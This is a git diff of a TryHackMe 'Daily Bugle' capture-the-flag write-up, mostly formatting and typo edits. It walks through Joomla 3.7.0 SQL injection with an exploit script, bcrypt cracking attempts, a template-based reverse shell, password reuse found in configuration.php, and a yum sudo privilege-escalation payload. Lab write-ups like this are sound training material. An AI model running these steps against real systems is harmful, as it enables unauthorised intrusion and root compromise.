@@ -6,13 +6,11 @@ categories:
   - TryHackMe
 ---
 
-<img src="bugle.png" width=200 height=200 alt="bugle">
+{{< post-img src="bugle.png" alt="bugle" style="width: 200px;" >}}
 
 ## Enumeration
 
-### Nmap
-
-```
+```bash
 PORT     STATE SERVICE REASON  VERSION
 22/tcp   open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
 | ssh-hostkey:
@@ -36,9 +34,7 @@ PORT     STATE SERVICE REASON  VERSION
 3306/tcp open  mysql   syn-ack MariaDB (unauthorized)
 ```
 
-### Ffuf
-
-```
+```bash
 .htaccess               [Status: 403, Size: 211, Words: 15, Lines: 9]
 administrator           [Status: 301, Size: 243, Words: 14, Lines: 8]
 .htpasswd               [Status: 403, Size: 211, Words: 15, Lines: 9]
@@ -64,50 +60,44 @@ tmp                     [Status: 301, Size: 233, Words: 14, Lines: 8]
 First hard machine
 
 I know I may not be ready yet but I want to see how hard things can get irl
-
 I will do this slowly and use other's walktrough writeups when needed
-
 There is a login page in "administrator" directory
-
 Its a joomla website but we need the version to search for vulnerabilities
-
 googling "how to check joomla version" we get
 
 `http://10.10.100.174/administrator/manifests/files/joomla.xml`
 
-```
+```bash
 files_joomla Joomla! Project admin@joomla.org www.joomla.org (C) 2005 - 2017 Open Source Matters. All rights reserved GNU General Public License version 2 or later; see LICENSE.txt 3.7.0 April 2017 FILES_JOOMLA_XML_DESCRIPTION administrator/components/com_admin/script.php administrator/components/com_admin/sql/updates/mysql administrator/components/com_admin/sql/updates/sqlazure administrator/components/com_admin/sql/updates/sqlazure administrator/components/com_admin/sql/updates/postgresql administrator bin cache cli components images includes language layouts libraries media modules plugins templates tmp htaccess.txt web.config.txt LICENSE.txt README.txt index.php https://update.joomla.org/core/list.xml
 ```
 
 Joomla 3.7.0
 
 its seems to be vulnerable to sql injection `CVE-2017-8917`
-
 the room suggests not using sqlmap but a python script
-
 we google cve that-specific-cve script and TA-DAA we got a script (hard work lol)
 
 For the sake of credits its: `joomblah` from stefanlucas (thanks)
 
 this script works better with python2...I needed to install pip and requests to make it
 
-```
+```bash
 curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
 python2 get-pip.py
 python2 -m pip install requests
 ```
 
-There is a python 3 version commited by mats-codes (commit #18) but its not complete fix
+There is a python 3 version committed by mats-codes (commit #18) but its not complete fix
 
 According to reddit:
 
-```
+```text
 Fix for the joomblah.py script Add .decode('utf-8') to the end of line 46 so it looks like this result += value.decode('utf-8')
 ```
 
 Anyway I used the python 2 method and it works
 
-```
+```bash
 └──╼ $python2 joomblah.py http://10.10.135.31/
 
 .---. .-'''-. .-'''-.
@@ -136,7 +126,7 @@ we get jonah creds but pass is hashed
 
 lets identify the hash
 
-```
+```bash
 $haiti '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
 bcrypt [HC: 3200] [JtR: bcrypt]
 Blowfish(OpenBSD) [HC: 3200] [JtR: bcrypt]
@@ -145,9 +135,9 @@ Woltlab Burning Board 4.x
 
 BCRYPT??? Oh lord this is why its a hard room
 
-Its gonna take years for me
+Its gonna take years for me and my children
 
-```
+```bash
 hashcat -a 0 -m 3200 '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' /usr/share/wordlists/rockyou.txt
 ```
 
@@ -155,7 +145,7 @@ By God this is painful...I hash at 13H/s...I can't go through rockyou with that.
 
 Even with john its slow and takes forever`
 
-```
+```bash
 $john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 0g 0:00:01:13 0,02% (ETA: 2021-11-15 23:37) 0g/s 38.93p/s 38.93c/s 38.93C/s skater1..firefly
 ```
@@ -168,9 +158,9 @@ I had to look for a writeup that had the answer (close it after you get the pass
 
 We use those at administrator page and login
 
-immediately look for extensions, plugins or templates pages for uploads or custom code possibilty
+Immediately look for extensions, plugins or templates pages for uploads or custom code possibility
 
-in extensions/templates there are 2 templates we can customize
+In extensions/templates there are 2 templates we can customize
 
 we cant upload directly so we have to modify a page or create one
 
@@ -182,7 +172,7 @@ I visit that and get access on netcat
 
 ugly shell evolves into better TTY
 
-```
+```bash
 sh-4.2$ python -c 'import pty; pty.spawn("/bin/bash")'
 python -c 'import pty; pty.spawn("/bin/bash")'
 bash-4.2$
@@ -190,7 +180,7 @@ bash-4.2$
 
 we can't get user flag yet
 
-```
+```bash
 cd jjameson
 bash: cd: jjameson: Permission denied
 ```
@@ -199,7 +189,7 @@ let's check the website directory for creds..as there is a mysql db..the php fil
 
 `cat configuration.php`
 
-```
+```php
 <?php
 class JConfig {
         public $offline = '0';
@@ -269,7 +259,7 @@ Maybe jjameson use the same pass for system (and maybe ssh too...)
 
 `jjameson : nv5uz9r3ZEDzVjNu`
 
-```
+```bash
 su jjameson
 Password: nv5uz9r3ZEDzVjNu
 
@@ -283,7 +273,7 @@ now we are good
 
 further privileges are required...let's evolve again
 
-```
+```bash
 sudo -l
 Matching Defaults entries for jjameson on dailybugle:
 !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
@@ -302,7 +292,7 @@ Ah yes..the description said something about yum..let's ask gtfobins real quick
 
 He said this:
 
-```
+```bash
 TF=$(mktemp -d)
 cat >$TF/x<<EOF
 [main]
@@ -330,20 +320,17 @@ sudo yum -c $TF/x --enableplugin=y
 
 wise words indeed
 
-```
+```bash
 sh-4.2# id
 uid=0(root) gid=0(root) groupes=0(root)
 ```
 
 Actually just copy-pasting that works
-
 what this does is basically craft a yum plugin that spawn a shell and enable/load the custom plugin
-
 Alternatively you can craft the plugin on your own side then upload it (see gtfobins again)
-
 Anyway we are done here
 
-```
+```bash
 sh-4.2# cd /root
 sh-4.2# ls
 anaconda-ks.cfg  root.txt
@@ -351,15 +338,11 @@ sh-4.2# cat root.txt
 ```
 
 This was amazing...I think the main thing that made this HARD is the Bcrypt hash
-
 that single step I could not overcome alone...my computer and internet were both not good enough
-
 But I think by optimizing my wordlists and creating specific and targeted ones I can bruteforce that
-
-By exemple knowing jonah his password could be anything like..'jonah', 'peter', 'jameson', 'dailybugle','spiderman'...
+By example knowing jonah his password could be anything like..'jonah', 'peter', 'jameson', 'dailybugle','spiderman'...
 
 All that mixed with numbers and special chars
-
 But we all know what his biggest obsession is
 
-Dammit peter get him those pictures
+Dammit peter get him those spiderman pictures
